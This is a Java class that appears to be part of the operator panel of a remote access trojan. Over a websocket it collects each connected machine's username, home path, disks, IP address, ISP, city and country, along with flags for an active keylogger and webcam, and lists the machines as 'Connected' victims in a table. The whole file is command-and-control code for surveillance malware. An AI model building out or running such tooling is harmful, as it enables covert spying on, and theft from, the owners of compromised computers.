package Connections;

import GUI.Main;
import Information.Information;
import Information.NetworkInformation;
import Information.SystemInformation;
import org.json.JSONArray;
import org.json.JSONObject;
import org.eclipse.jetty.websocket.api.Session;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableModel;

public class Client {
    private Session session;

    private SystemInformation sysInfo;

    private NetworkInformation netInfo;
    ;

    public Client(Session session) {
        this.session = session;
    }

    public void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
        String operatingSystem = jsonObject.getString("win_ver");
        String userProfile = jsonObject.getString("user_profile");
        String homePath = jsonObject.getString("home_path");
        String homeDrive = jsonObject.getString("home_drive");
        String username = jsonObject.getString("username");
        JSONArray userDisksJsonArray = jsonObject.getJSONArray("disks");
        String userDisks = userDisksJsonArray.toString();
        String tagName = jsonObject.getString("tag_name");
        boolean webcam = jsonObject.getBoolean("webcam");
        boolean keylogger = jsonObject.getBoolean("keylogger");
        String uuid = "yourUUID";
        sysInfo = new SystemInformation(operatingSystem, userProfile, homePath, homeDrive, username, userDisks, tagName, webcam, keylogger, uuid);
        String ip = jsonObject.getString("query");
        String internetCompanyName = jsonObject.getString("isp");
        String userContinent = jsonObject.getString("continent");
        String userCountry = jsonObject.getString("country");
        String userRegion = jsonObject.getString("region");
        String userCity = jsonObject.getString("city");
        String userZone = jsonObject.getString("timezone");
        String userCurrency = jsonObject.getString("currency");
        boolean userProxy = jsonObject.getBoolean("proxy");
        netInfo = new NetworkInformation(ip, internetCompanyName, userContinent, userCountry, userRegion, userCity, userZone, userCurrency, userProxy);
    }

    public void addRowOfNewConnection(JSONObject jsonObject) {
        convertJSON2NetAndSysInfo(jsonObject);
        SwingUtilities.invokeLater(() -> {
            TableModel tableModel = Main.gui.getConnectionsTable().getModel();
            /*int existingClientRow = getPositionOfExisting(identifier, tableModel); // position if exists in JTable
            if (existingClientRow != -1) {  // change state of connection
                tableModel.setValueAt("Connected", existingClientRow, tableModel.getColumnCount() - 1);
            } else { // new connection*/
            String[] tableRow = new String[]{
                    sysInfo.UUID(),
                    netInfo.IP(),
                    netInfo.USER_COUNTRY(),
                    sysInfo.TAG_NAME(),
                    sysInfo.USER_NAME(),
                    sysInfo.OPERATING_SYSTEM(),
                    "Connected"
            };
            DefaultTableModel defaultTableModel = (DefaultTableModel) tableModel;
            defaultTableModel.addRow(tableRow);
            // }
            //if (ServerGUI.isNotifications() && SystemTray.isSupported())
            //  displayTray(netInfo.IP(), sysInfo.OPERATING_SYSTEM());
            Main.gui.updateNumOfConnectedClients();
        });
    }

    public void processMessage(String message) {
        JSONObject object = new JSONObject(message);
        switch (object.getString("response")) {
            case "sys_net_info" -> {
                addRowOfNewConnection(object);
            }
            default -> {
                System.out.println(message);
            }
        }
    }

    public void processMessage(byte[] message) {

    }
}
